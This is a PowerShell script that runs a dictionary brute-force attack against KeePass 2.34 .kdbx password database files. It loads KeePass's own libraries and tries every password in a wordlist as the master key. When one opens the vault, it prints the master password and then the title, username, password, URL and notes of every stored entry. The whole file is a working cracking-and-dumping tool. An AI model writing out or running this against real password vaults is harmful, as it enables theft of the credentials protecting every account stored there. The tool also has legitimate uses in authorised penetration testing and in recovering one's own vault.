#requires -version 2
<#
.SYNOPSIS
  
  This script provides a simple dictionary based brute force function allowing you to run a dictionary file against a KeePass 2.34 .kdbx file.  If it finds the key, it will dump all passwords as output as well as inform you of the master password

.DESCRIPTION
  
  The script performs a dictionary attack against keepass .kdbx files

.PARAMETER binpath
    
    This is the path for the KeePass 2.34 files - Typically on a default install will be "c:\program files (x86)\KeePass2x\"


.PARAMETER pwdpath
    
    This is the path for the password file to use in the brute force attempt

.PARAMETER targetfile
    
    This is the path for the target kdbx file


.NOTES
  Version:        0.1
  Author:         Wayne Evans
  Creation Date:  20/12/2016
  Purpose/Change: Initial script development

  This script is quite slow, but will get the job done - It works at about 500 keys per second currently.  
  
.EXAMPLE

crack-keepassfile -binpath "C:\program files (x86)\KeePass2x" -pwdfile "c:\software\pwdlist.txt" -targetfile "c:\software\posh.kdbx"

.TODO

1)allow generated patterns to be used to brute force rather than a dictionary file

  
#>




#----------------------------------------------------------[Declarations]----------------------------------------------------------

#blank some key variables just in case
$passwordList=""
$Password=""


#-----------------------------------------------------------[Functions]------------------------------------------------------------

function Load-KeePassBinarys {
    param(
        [Parameter(Mandatory=$true)]
        [String]$path
    )
    begin { 
        if((Test-Path $path) –eq $false) 
        {
            Write-Output "The path $path is invalid"
            Write-Output "Testing Default Path"
            if((Test-Path "C:\Program Files (x86)\KeePass2x") –eq $true)
            {
                $path="C:\Program Files (x86)\KeePass2x"
                Write-Output "Using Default Path $path"
            }
        }
    }
    process {
        try { 
            [Reflection.Assembly]::LoadFile("$path\KeePass.exe")|Out-Null
        } catch
        { 
            Write-Warning "Unable Load KeePass Binarys - check path $path"
            break
        }
        try { 
            [Reflection.Assembly]::LoadFile("$path\KeePass.XmlSerializers.dll")|Out-Null
        } catch 
        {
            Write-Warning  "Unable Load KeePass Binarys - check path $path"
            break
        }
    }
    end {
        Write-Output "KeePass Binaries loaded from $path"
    }
}

function try-key($x) {
    $Key = New-Object KeePassLib.Keys.CompositeKey
    $Key.AddUserKey((New-Object KeePassLib.Keys.KcpPassword($x)));
    try {
        $Database.Open($IOConnectionInfo,$Key,$null)

        $items=""
        Write-Warning "Master Password Found = $x "
        Write-Output "================="
        $Items = $Database.RootGroup.GetObjects($true, $true)
        foreach($Item in $Items)
        {
            Write-Output Title=$($Item.Strings.ReadSafe("Title"))
            Write-Output UserName=$($Item.Strings.ReadSafe("UserName"))
            Write-Output Password=$($Item.Strings.ReadSafe("Password"))
            Write-Output URL=$($Item.Strings.ReadSafe("URL"))
            Write-Output Note=$($Item.Strings.ReadSafe("Note"))
            Write-Output "================="
        }
        $Database.Close()
        break
    }
    catch {

    }
}

function load-passwordfile{
    param(
        [Parameter(Mandatory=$true)]
        [string]$filepath
    )
    begin {
        if ((Test-Path $filepath) –eq $false) {
            Write-Output "The Password File Path: $path is invalid"
            Write-Output "Checking for Default List"
            if((Test-Path ".\pwdlist.txt") –eq $true)
            {
                $filepath=".\pwdlist.txt"
                Write-Output "Using Default Password File:$filepath"
            }
            else
            {
                Write-Output "Unable to locate default password file : pwdlist.txt"
                break
            }
        }
    }
    process {
        Write-Output "loading pwd list from $filepath"
        $pwdfile = New-Object System.IO.StreamReader -Arg $filepath
        $count=0
        $sw = [Diagnostics.Stopwatch]::StartNew()
        while($password = $pwdfile.ReadLine()) {
            try-key($password)
            if ($count % 1000 -eq 0)
            {
                Write-Output "Number of Keys checked against Database:$count Elapsed Time = $($sw.Elapsed)"
            }
            $count++
        }
    }
    end {
        $pwdfile.close()
        $sw.Stop()
    }
}

function check-kdbxfile{
    Param(
        [Parameter(Mandatory=$true)]
        [string]$targetfile
    )
    begin {
        if((Test-Path $targetfile) –eq $false) {
            Write-Output "The Target File Path: $path is invalid"
            break
        }
    }
    process {
        Write-Output "Confirmed Target Path"
        $IOconnectionInfo.Path = $targetfile
        return $targetfile
    }
    end {

    }
}

function crack-keepassfile{
    param(
        [Parameter(Mandatory=$true)]
        [string]$binpath,
        [string]$pwdpath,
        [string]$targetfile
    )
    begin {
        load-keepassbinarys -path $binpath
        $Database = New-Object KeePassLib.PwDatabase
        $IOConnectionInfo = New-Object KeePassLib.Serialization.IOConnectionInfo
        $target=check-kdbxfile -target $targetfile
    }
    process {
        load-passwordfile -filepath $pwdpath
    }
    end {

    }
}


#-----------------------------------------------------------[Execution]------------------------------------------------------------